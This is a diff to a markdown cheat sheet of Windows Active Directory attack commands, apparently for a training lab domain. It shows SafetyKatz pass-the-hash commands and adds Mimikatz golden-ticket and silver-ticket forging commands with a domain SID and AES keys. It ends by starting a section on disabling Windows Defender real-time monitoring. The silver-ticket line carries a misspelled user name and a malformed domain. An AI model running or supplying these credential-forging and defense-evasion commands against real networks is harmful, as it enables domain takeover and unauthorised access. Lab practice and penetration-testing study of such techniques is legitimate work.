@@ -27,6 +27,16 @@ C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:provisioningsvc /domain:us.t
 ```
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a  /run:cmd.exe"
 ```
+## Mimikatz
+Golden ticket:
+```
+kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+```
+Silver ticket:
+```
+kerberos::golden /User:Adminsitrator /domain:us-techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /target:us-dc.us.techcorp.local /service:HOST /startoffset:0 /endin:600 /renewmax:10080 /ptt
+```
+
 
 ## Windows defender 
 Disable Realtime Monitoring
